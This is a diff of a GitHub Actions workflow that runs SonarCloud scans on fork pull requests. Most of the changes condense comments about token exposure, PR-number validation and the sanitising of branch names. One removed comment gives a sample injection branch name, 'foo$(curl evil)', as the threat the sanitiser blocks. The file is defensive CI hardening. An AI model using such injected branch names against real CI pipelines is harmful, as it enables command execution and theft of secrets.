@@ -1,23 +1,11 @@
 name: Common SonarCloud fork-PR analysis workflow
 
-# SonarCloud analysis for pull requests opened from forks.
+# Fork PRs get no secrets, so the caller triggers this on `workflow_run` after the PR build,
+# where the base repository's SONAR_TOKEN is available.
 #
-# Fork PRs never receive repository secrets, so the standard
-# workflow-common-sonarcloud.yml self-skips them (no SONAR_TOKEN). This workflow
-# closes that gap using the secure-by-design `workflow_run` pattern: the caller
-# is triggered by `workflow_run` once the untrusted PR build has finished, so it
-# executes in the BASE repository's trusted context and therefore has access to
-# SONAR_TOKEN. It re-checks-out the fork's head commit and runs a full
-# begin -> build -> test -> end scan, decorating the originating PR.
-#
-# SECURITY: this job builds untrusted fork code on a runner that holds
-# SONAR_TOKEN, so a malicious fork could attempt to read it. That exposure is
-# inherent to the SonarScanner-for-.NET model (the scanner must wrap the real
-# build) and is accepted because SONAR_TOKEN is scoped to a single project's
-# analysis. Mitigations applied here: we only run after the PR build concluded,
-# we check out the immutable head SHA, and the fork-controlled PR branch/base
-# names are sanitised before they reach the scanner command line. Do NOT add
-# steps that grant this job higher-privilege secrets.
+# SECURITY: this builds untrusted fork code on a runner holding SONAR_TOKEN. The scanner has to
+# wrap the real build, so that exposure is accepted for a token scoped to one project's analysis.
+# Never give this job a higher-privilege secret.
 
 permissions:
   contents: read
@@ -150,19 +138,14 @@ on:
 
 jobs:
   sonarcloud-fork:
-    # Defensive guard: only analyse a fork PR whose build run concluded. The
-    # caller is expected to gate this too; this keeps the reusable workflow safe
-    # if called directly. Same-repo PRs are handled by the standard workflow, so
-    # they are excluded here to avoid double analysis.
+    # Same-repo PRs are scanned by workflow-common-sonarcloud.yml.
     if: >-
       github.event.workflow_run.event == 'pull_request' &&
       github.event.workflow_run.head_repository.full_name != github.repository
     runs-on: ${{ inputs.runsOn }}
     env:
       DOTNET_CLI_WORKLOAD_UPDATE_NOTIFY_DISABLE: 1
-      # Surface SONAR_TOKEN to the composite sonarcloud action (which reads env,
-      # not inputs). See SECURITY note in the file header: this is in scope while
-      # the fork build runs, which is the accepted trade-off of this pattern.
+      # Composite actions cannot declare secret inputs, so the sonarcloud action reads this from env.
       SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
     steps:
       - name: Validate SonarCloud token
@@ -185,8 +168,7 @@ jobs:
         id: prargs
         shell: bash
         env:
-          # head_branch is attacker-controlled (fork PR); read it via env, never
-          # interpolate it straight into a run script.
+          # Fork-controlled: read through env, never interpolated into the script.
           HEAD_BRANCH: ${{ github.event.workflow_run.head_branch }}
         run: |
           set -euo pipefail
@@ -194,15 +176,12 @@ jobs:
           number=$(cat "${meta}/number")
           base=$(cat "${meta}/base")
 
-          # The PR number becomes the Sonar PR key — it must be purely numeric.
+          # Numeric only: it is interpolated into the checkout ref and the scanner command line.
           case "$number" in
             ''|*[!0-9]*) echo "::error::PR number artifact is not numeric: '$number'"; exit 1 ;;
           esac
 
-          # Branch/base names are spliced into the UNQUOTED sonarscanner begin
-          # command line by the composite action, so strip anything outside a
-          # safe git-ref charset to prevent shell/argument injection from a
-          # hostile fork branch name (e.g. "foo$(curl evil)").
+          # The scanner command line is unquoted, so fork-controlled names are cut down to a safe ref charset.
           sanitize() { printf '%s' "$1" | tr -cd 'A-Za-z0-9._/-'; }
           branch_safe=$(sanitize "$HEAD_BRANCH")
           base_safe=$(sanitize "$base")
@@ -215,14 +194,8 @@ jobs:
       - name: Checkout PR head
         uses: actions/checkout@v7
         with:
-          # Check out the PR head through the BASE repo's refs/pull/<n>/head ref
-          # rather than the fork repository directly. This still builds the
-          # fork's exact head commit, but keeps the upstream release tags
-          # reachable so MinVer (and anything version-sensitive downstream, e.g.
-          # source-generator snapshot tests) computes the SAME version as a
-          # normal build. Checking out the fork loses those tags and yields a
-          # wrong version. The PR number is validated numeric above, so it is
-          # safe to interpolate into the ref.
+          # The base repo's pull ref builds the fork's head commit with the upstream tags reachable,
+          # so MinVer computes the same version as a normal build.
           ref: refs/pull/${{ steps.prargs.outputs.number }}/head
           fetch-depth: 0
           persist-credentials: false
@@ -248,8 +221,6 @@ jobs:
           organization: ${{ inputs.sonarOrganization }}
           host-url: ${{ inputs.sonarHostUrl }}
           version: ${{ steps.environment.outputs.version-semver2 }}
-          # PR-decoration flags (sanitised above) first, then any trusted
-          # caller-supplied extras.
           extra-begin-args: ${{ steps.prargs.outputs.args }} ${{ inputs.sonarExtraBeginArgs }}
           exclusions: ${{ inputs.sonarExclusions }}
           coverage-exclusions: ${{ inputs.sonarCoverageExclusions }}
@@ -276,8 +247,7 @@ jobs:
           test-timeout: ${{ inputs.testTimeout }}
 
       - name: SonarCloud end
-        # Always end the scan if begin succeeded, so a failed build/test still
-        # uploads partial analysis instead of leaving the scan dangling.
+        # A failed build or test still uploads partial analysis.
         if: always()
         uses: reactiveui/actions-common/.github/actions/sonarcloud@main
         with:
